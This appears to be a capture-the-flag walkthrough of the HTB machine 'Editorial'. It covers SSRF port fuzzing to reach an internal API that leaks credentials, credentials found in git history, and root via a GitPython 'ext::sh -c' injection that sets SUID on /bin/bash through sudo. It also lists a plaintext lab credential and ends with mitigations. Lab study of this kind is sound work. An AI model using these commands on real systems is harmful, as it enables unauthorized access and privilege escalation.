---
title: Editorial
date: 2025-06-22
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB, Linux, SSRF, ffuf-request, .git, pythongit, sudo-git.Repo-privesc] 
image: edit.png
media_subpath: /assets/img/posts/2025-06-22-editorialHTB/
---

## Introduction

In this walkthrough, I worked on an **easy Linux machine** from HTB called *Editorial*. While analyzing the web application, I discovered an endpoint that made external HTTP requests — a clear indicator of **Server-Side Request Forgery (SSRF)**. I used `ffuf` to fuzz internal services and discovered API endpoint running on `localhost`. By querying this endpoint, I retrieved **shell credentials** and gained initial access. During post-exploitation, I read **Git logs** in a home directory and found additional credentials for **lateral movement**. Finally, I discovered that a Python script was using the vulnerable `git.Repo` class from the **pythongit** module. I exploited this to gain **root shell** access.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 22

## Web

### Port 80

Add the domain to `/etc/hosts` file.

```bash
**feroxbuster -u http://editorial.htb/ -w /usr/share/wordlists/dirb/common.txt -C 403,404,400**
```

![image.png](image%202.png)

```bash
gobuster dir -u http://$IP:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 42 -b 400,403,404
```

![image.png](image%203.png)

**Vhost Fuzzing**

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://editorial.htb/ -H 'Host: FUZZ.editorial.htb' -fs 178
```

![image.png](image%204.png)

Clicking on `Preview` it sends a request to the specified endpoint, when sending the request to `http://10.10.14.23` (my IP)  it returned:

![image.png](image%205.png)

When sending it to `http://127.0.0.1` it returned:

![image.png](image%206.png)

<aside>
💡

This is SSRF kind of vulnerability where we can make a request as server to somewhere else, we should find an endpoint where we can send that request, and this endpoint in most cases is open internally just for localhost.

</aside>

As making request to our IP returned no `.jpg` image I am gonna try brute-force ports and find one that does not return a `jpg` image.

As fuzzing this with `wfuzz` will be hard, I am gonna use `ffuf`:

```bash
ffuf -request portfuzzing -request-proto http -w <(seq 1 65535) -fs 61
```

![image.png](image%207.png)

Accessing the endpoint, it downloads some file and I opened it. It is in json format, let’s pretty-print it.

![image.png](image%208.png)

I found other endpoints of API, I am gonna send requests to those endpoints.

Interesting endpoints are `log` and `messages to authors`:

![image.png](image%209.png)

![image.png](image%2010.png)

Nothing interesting in `logs`:

![image.png](image%2011.png)

Using credentials I got access to ssh.

## Shell as dev

There is another user `prod`:

![image.png](image%2012.png)

I found `apps` directory going there I found that it is `bare` repo, I checked status and commits:

```bash
git log
```

![image.png](image%2013.png)

```bash
git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
```

![image.png](image%2014.png)

## Shell as prod

![image.png](image%2015.png)

```bash
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

It uses Python `Repo` module to clone repo.

I found the following [exploit](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858)

```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chmod% +s% /bin/bash'
```

Using the above command gave SUID bit to `/bin/bash` :

```bash
/bin/bash -p
```

![image.png](image%2016.png)

## Credentials

```bash
dev:dev080217_devAPI!@
```

## Mitigation

- Implement strict **SSRF protections**: restrict internal IP ranges and validate external request targets.
- Avoid exposing sensitive internal APIs to frontend-facing applications.
- Sanitize and restrict access to `.git` directories and **Git logs** in production environments.
- Avoid using insecure libraries or classes like `git.Repo` for untrusted input. Always validate repository sources.
- Apply **principle of least privilege** to prevent lateral movement and limit damage from compromised users.
